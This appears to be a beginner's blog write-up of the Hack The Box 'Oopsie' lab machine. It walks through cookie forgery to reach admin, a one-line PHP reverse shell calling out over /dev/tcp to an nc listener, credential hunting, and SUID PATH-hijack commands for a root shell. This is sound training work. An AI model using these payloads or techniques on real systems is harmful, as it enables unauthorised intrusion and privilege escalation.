---
title:  "Oopsie - Penetration Testing Write-Up"
layout: post
---

# Oopsie - Penetration Testing Write-Up

## Introduction

Alright here we go, first write up, getting into cyber (more) and I want to start describing my thinking methodology and pwn some machines!

We're starting with Oopsie, from Starting Point, in Hack The Box.
We're given some initial 'tags' of what we expect to find, this in particular looks to be web based!

Let's Begin

---

## Information Gathering

### Target Discovery

Considering it's web based, instead of `namp` on first go, I'll check out the ip in the browser.
![](https://i.imgur.com/5qeTCbr.png)


### Service Enumeration

Initially, poking around some directories / endpoints didn't lead me anywhere, network tab didn't seem too interesting either.  Let's run `nmap` and see what happens: 
`nmap -sC -sV {target_ip}`
![](https://i.imgur.com/p7pswlB.png)

Ok, looks like we have a couple ports open
- 22 / ssh, not sure if there is a misconfiguration I figure out there, but maybe.
- 80 / http, I'd imagine this will be our entry point, we also see this is Apache/2.4.29, maybe some vulns there?

First task in HTB, *With what kind of tool can intercept web traffic?* - Proxy (quick google search https://en.wikipedia.org/wiki/Proxy_server)

---

## Enumeration

Taking a look at the next task, it asks *What is the path to the directory on the webserver that returns a login page?* 
I tried some basic paths (/login and /admin lol) but I know Kali has some enumeration tools as well. After a quick look through the applications it seems like have 2 options that stood out, `dirb` and `dirbuster`.

![](https://i.imgur.com/NfeNDQE.png)

![](https://i.imgur.com/7rNtv4i.png)

Looks like `dirbuster` didn't give us all that much.

`dirb` however, is giving us a few directories to check out!

![](https://i.imgur.com/GtXhruq.png)

None of them were helpful :o

Let's go with another approach, it hinted proxy at the beginning, and we have a pattern to look for. `/xxx-xxx/xxxxn` since Burp Suite has a Proxy, let's check it out.
If we turn intercept on, navigate to the webpage using their browser, and check out the history tab, we see something pretty promising...
Let's try `http://{target_ip}/cdn-cgi/login/`

![](https://i.imgur.com/EEjRCH0.png)

And just like that, Boom, we got something.

![](https://i.imgur.com/ZAeL1jm.png)


Logging in as guest, and poking around, initially I didn't find anything too *revealing*, looks like there is a location to upload files, see your account details, clients, blah, blah, blah.
Uploads are blocked for the guest. Looking at the next Hack The Box task we are going to want to change that.
We can see some information in the storage tab in Firefox that is showing us some valuable insights into how the cookies are being used.

![](https://i.imgur.com/JTV6itj.png)

We are storing two cookies, the role, and the user.

---

## Vulnerability Identification

After poking around for a minute, on the Account page, it looks like we have an Access ID that matches what we see in the cookies. Additionally, the url query parameter is `id=2`, let's see if we can poke any holes.

![](https://i.imgur.com/IiQ6pDF.png)


| id  | user  | Access ID |
| --- | ----- | --------- |
| 1   | admin | 34322     |
| 2   | guest | 2233      |
| 4   | john  | 8832      |
| 13  | Peter | 57633     |

I went up to 20 manually, but I'm sure there is a way to enumerate via burp script to see other options.
With the Access ID and Burp Suite maybe we can forge the cookies to make it look like we are the admin.
My first attempt seemed to work out just fine. changing the user cookie to the admin's Access ID and the role to admin (I'm more confident that the access ID is what mattered here but made it in.(future Anthony here, the role cookie did matter.))

![](https://i.imgur.com/nguDUux.png)

This allows us now to look at the file upload page. Time we drop our payload.

---

## Exploitation

![](https://i.imgur.com/shrWdcj.png)


Now that we are in position to exploit a vulnerability, let's take a step back and confirm what we know so we can better search for an exploit.
- This is an Ubuntu machine.
- Running a PHP web app.
- We can easily forge cookies to appear as the admin.

After some research, trial and error, and a day or two later I stumbled upon this [gist](https://gist.github.com/rshipp/eee36684db07d234c1cc). This gave me a super easy one line php reverse shell.

``` php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.190/1337 0>&1'");

```

Now let's give this a try.
1. `nc -l -p 1337`
2. Create the PHP file
3. Forge the cookies
4. Upload files
5. Navigate to the file (with forged cookies).

And just like that, we're in.

![](https://i.imgur.com/ofJ6KNn.png)


---

## Post-Exploitation

I'm not proud of it, but i used the find command to locate the correct file with credentials given the pattern provided by HTB. It may have taken me a little while to find the correct file.
![](https://i.imgur.com/ROousO0.png)

And, now we can move laterally and ssh in as Robert.

Immediately this gives us the user flag. I was also able to get the user flag with the reverse shell, but considering we found credentials, this seemed to be the intended direction.

---

## Privilege Escalation

The next tasks are asking about SUID and permissions, now we can work on escalating our privilege to get the root flag.

After some research, [PurpleBox](https://www.prplbx.com/resources/blog/linux-privilege-escalation-with-path-variable-suid-bit/) had a nice write up on what this is and how we can escalate using this method.

To give a brief overview:

The SUID (Set Owner User ID) bit on a file makes it run as the owner of the file, not the user executing it. If that owner is `root`, and the binary isn't careful, we can abuse it to escalate privileges.

In this case, we're targeting a specific class of vulnerable SUID binaries, ones that run system commands without specifying the full path (like calling `cat` instead of `/bin/cat`). This opens the door for PATH hijacking.

1. Find SUID executables:
```bash
find / -perm -4000 -type f 2>/dev/null
```

2. Identify a binary that calls external programs unsafely** (e.g. using `system("cat")`). Tools like `strings`, `ltrace`, or just running the binary can help spot this.

3. Drop a malicious file in `/tmp` with the same name as the expected command:

```bash
echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash' >> /tmp/cat
chmod +x /tmp/cat
```

4. Prepend `/tmp` to the PATH:

```bash
export PATH=/tmp:$PATH
```

5. **Run the SUID binary**—if it calls `cat`, it’ll now execute your version **as root**, giving you a root shell.

> Note: This only works if the binary doesn’t use full paths and your environment/path isn't sanitized. Always check those first.

With root, we can now easily get the flag from `/root/root.txt`

---

## Outcome

I've done a few boxes in the past, and mostly using writeups, this one not so much, albeit it was pretty easy. This first box, and this write up, is how I am fully starting my journey to get my OSCP. This is something I've been wanting to dive into and now, after graduating, I can devote a lot more time to cyber.
This box taught me a lot! We dove into cookie manipulation, arbitrary file upload, php reverse shells, SUID hijacking to eventually achieve root. I look forward to popping more shells. Thank you for joining me on this journey!

---

## Notes

Lastly, I want to compare my approach to the [official write](blob:https://app.hackthebox.com/f5bf5b8d-fa56-49cb-b176-15d86e0a40c4) up to see what I missed, or what I did well on, or just some thoughts I had while reading the write up after solving the box.
- Burp found the login page via spidering / crawling.
- It seems I stumbled upon the same road as the write up for updating the id parameter in the url
- Ill have to look at gobuster next time, dirb was able to find the directory, but another tool in my arsenal seems to be a good idea.
- instead of logging in via the Robert user, they used Python to spawn a bash shell. Good to know but it is dependent on Python being installed.
- Ahh their `cat * | grep -i passw*` method needs to be taken note of.
- I also don't have much Linux sysadmin experience so knowing the id command is how they identified the bugtracker group.


---
